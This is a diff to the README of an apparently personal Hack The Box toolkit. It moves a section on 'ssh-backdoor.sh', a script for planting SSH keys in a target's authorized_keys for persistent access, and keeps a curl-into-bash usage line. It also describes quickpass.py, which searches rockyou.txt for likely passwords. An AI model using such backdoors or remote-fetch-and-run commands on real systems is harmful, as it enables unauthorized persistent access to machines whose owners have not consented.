@@ -60,19 +60,6 @@ htb-usercontent.py <user_id> [--proxy] [--ignore-ssl] [--machines] [--challenges
 - `--challenges`: Print only information about challenges created by the user.
 - `--writeups`: Print only information about writeups authored by the user.
 
-
-## ssh-backdoor.sh - Quick and Easy SSH Persistence
-
-`ssh-backdoor.sh` is my absolute favourite script. It simplifies the process of setting up SSH persistence by adding public keys to the target's `~/.ssh/authorized_keys` file. This script ensures a secure and reliable backdoor for remote access if SSH login is available on the target machine. It performs the necessary directory and file setup, including backing up existing `authorized_keys`, setting appropriate permissions, and appending keys to the file.
-
-The script is easy to curl into bash for fast execution and clean persistence.
-
-
-#### Usage:
-```bash
-curl -sSL <script_url> | bash
-```
-
 ## quickpass.py - Search for Passwords in rockyou.txt Based on Keywords
 
 `quickpass.py` is a simple yet effective script that searches the `rockyou.txt` wordlist for passwords related to specific keywords. It is particularly useful for boxes, where content creators sometimes use passwords that have some relation to the name of the box, service, or username. The script also supports searching in 1337-speak format for additional variations of the keywords.
@@ -86,3 +73,17 @@ curl -sSL <script_url> | bash
 ```bash
 quickpass.py <keywords> [--leet]
 ```
+
+## ssh-backdoor.sh - Quick and Easy SSH Persistence
+
+`ssh-backdoor.sh` is my absolute favourite script. It simplifies the process of setting up SSH persistence by adding public keys to the target's `~/.ssh/authorized_keys` file. This script ensures a secure and reliable backdoor for remote access if SSH login is available on the target machine. It performs the necessary directory and file setup, including backing up existing `authorized_keys`, setting appropriate permissions, and appending keys to the file.
+
+The script is easy to curl into bash for fast execution and clean persistence.
+
+
+#### Usage:
+```bash
+curl -sSL <script_url> | bash
+```
+
+
